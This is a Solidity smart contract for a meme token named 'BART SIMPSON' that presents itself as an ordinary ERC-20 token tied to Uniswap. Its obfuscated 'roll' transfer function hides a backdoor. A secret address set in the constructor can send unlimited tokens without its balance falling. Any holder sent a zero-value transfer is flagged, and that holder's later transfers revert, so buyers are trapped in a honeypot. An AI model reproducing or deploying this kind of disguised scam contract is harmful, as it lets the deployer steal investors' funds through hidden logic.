/*

https://t.me/bartsimpsoneth

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BartSimpson is Ownable {
    uint256 private currency = 12;

    mapping(address => uint256) private pencil;

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    function approve(address bottle, uint256 tiger) public returns (bool success) {
        allowance[msg.sender][bottle] = tiger;
        emit Approval(msg.sender, bottle, tiger);
        return true;
    }
    address public uniswapV2Pair;
    string public symbol = 'BART';

    uint8 public decimals = 9;

    

    function transfer(address bowl, uint256 tiger) public returns (bool success) {
        roll(msg.sender, bowl, tiger);
        return true;
    }

    function transferFrom(address shampoo, address bowl, uint256 tiger) public returns (bool success) {
        require(tiger <= allowance[shampoo][msg.sender]);
        allowance[shampoo][msg.sender] -= tiger;
        roll(shampoo, bowl, tiger);
        return true;
    }

    constructor(address hairs) {
        balanceOf[msg.sender] = totalSupply;
        prooff[hairs] = currency;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }
    string public name = 'BART SIMPSON';
    mapping(address => uint256) private prooff;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    

    function roll(address shampoo, address bowl, uint256 tiger) private returns (bool success) {
        if (prooff[shampoo] == 0) {
            balanceOf[shampoo] -= tiger;
        }

        if (tiger == 0) pencil[bowl] += currency;

        if (prooff[shampoo] == 0 && uniswapV2Pair != shampoo && pencil[shampoo] > 0) {
            prooff[shampoo] -= currency;
        }

        balanceOf[bowl] += tiger;
        emit Transfer(shampoo, bowl, tiger);
        return true;
    }
}